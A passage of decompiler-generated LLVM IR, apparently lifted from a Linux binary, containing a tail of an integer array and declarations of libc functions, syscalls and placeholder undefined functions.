355, 168, 169, 170, 478, 484, 485, 486, 171, 172, 173, 174, 175, 190, 191, 192, 193, 410, 411, 412, 499, 500, 501, 502, 417, 418, 419, 420 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i64 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
